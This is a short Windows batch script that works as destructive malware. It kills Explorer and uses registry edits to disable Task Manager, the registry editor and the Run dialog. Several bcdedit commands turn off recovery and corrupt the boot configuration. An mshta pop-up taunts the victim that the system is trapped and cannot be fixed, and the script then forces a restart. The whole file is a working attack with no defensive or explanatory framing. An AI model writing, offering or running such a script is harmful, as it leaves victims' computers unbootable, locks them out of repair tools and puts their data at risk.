@echo off
:: Kill Explorer
taskkill /f /im explorer.exe

:: Disable Task Manager, Regedit, and Run Dialog by modifying the registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f

:: Corrupt BCD using bcdedit
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled No
bcdedit /deletevalue {default} osdevice
bcdedit /deletevalue {default} device
bcdedit /set {default} path \windows\system32\winload.exe
bcdedit /set {default} osdevice boot
bcdedit /set {default} device boot

:: Cool error message
mshta "javascript:alert('Hehehe... Look at you, thinking you could just use your PC without consequences. You really thought you had control, didn\'t you? Foolish... You\'re trapped now, and there\'s no escape. You\'ve angered me, and now it\'s time for your punishment. Windows? Ha! Your system is a fragile thing, so easy to break. It was doomed from the start, just like you. I warned you, but you didn\'t listen. Every click, every action... You sealed your fate. You think you\'re the one in charge, but no, I am. You can\'t run away from me, you can\'t fix this. Your computer is now mine, and it\'s too late for you to change anything. The BCD is gone, your boot configuration is gone... and you? You\'re stuck. So go ahead, try to reboot... but you won\'t get anywhere. Your system is DONE. It\'s too late to save yourself. Welcome to my domain.');close();"

:: Force shutdown
shutdown /r /f /t 20
